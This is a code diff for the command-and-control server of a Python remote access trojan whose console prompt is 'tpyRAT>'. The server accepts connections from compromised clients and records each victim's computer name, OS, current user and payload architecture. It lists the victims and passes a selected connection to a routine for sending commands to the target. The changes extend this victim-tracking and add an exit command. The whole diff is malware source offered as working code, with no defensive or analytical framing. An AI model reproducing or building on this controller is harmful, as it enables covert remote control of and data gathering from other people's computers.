@@ -9,6 +9,8 @@ JOB_NUMBER = [1, 2]
 queue = Queue()
 all_connections = []
 all_address = []
+# All os information sent from client has to be stored in a list.
+all_os_info = []
 
 def help_menu():
     print('''
@@ -39,7 +41,7 @@ def bind_socket():
         global host
         global port
         global s
-        print("Binding the Port: " + str(port))
+        #print("Binding the Port: " + str(port))
 
         s.bind((host, port))
         s.listen(5)
@@ -58,16 +60,21 @@ def accepting_connections():
 
     del all_connections[:]
     del all_address[:]
+    del all_os_info[:]
 
     while True:
         try:
             conn, address = s.accept()
             s.setblocking(1)  # prevents timeout
 
+            # Recv OS info from client.
+            os_info = conn.recv(4096).decode('utf-8')
             all_connections.append(conn)
             all_address.append(address)
+            all_os_info.append(str(os_info))
 
-            print("Connection has been established: " + address[0])
+
+            print("\n Connection has been established: " + address[0] + "\r")
 
         except:
             print("Error accepting connections")
@@ -84,7 +91,6 @@ def accepting_connections():
 
 
 def start_turtle():
-
     while True:
         cmd = input('tpyRAT> ')
         if cmd == 'list':
@@ -95,7 +101,8 @@ def start_turtle():
                 send_target_commands(conn)
         elif 'help' in cmd:
             help_menu()
-
+        elif 'exit' in cmd:
+            break
         else:
             print("Command not recognized")
 
@@ -104,7 +111,7 @@ def start_turtle():
 
 def list_connections():
     results = ''
-
+        
     for i, conn in enumerate(all_connections):
         try:
             conn.send(str.encode(' '))
@@ -112,16 +119,15 @@ def list_connections():
         except:
             del all_connections[i]
             del all_address[i]
+            del all_os_info[i]
             continue
 
-        results = str(i) + "   " + str(all_address[i][0]) + ":" + str(all_address[i][1]) + "\n"
-        current_conn = all_connections[i]
-        received_data = current_conn.recv(2048)
-        print('ID:    IP:PORT')
-        print(results)
+        results = str(i) + "   " + str(all_address[i][0]) + ":" + str(all_address[i][1]) + " " +  all_os_info[i] + "\n"
+
         
-
-
+        
+        print('ID: IP:PORT         COMPUTER NAME:     OS:                       CURRENT USER: PAYLOAD ARCH:')
+        print(results)
 
 # Selecting the target
 def get_target(cmd):
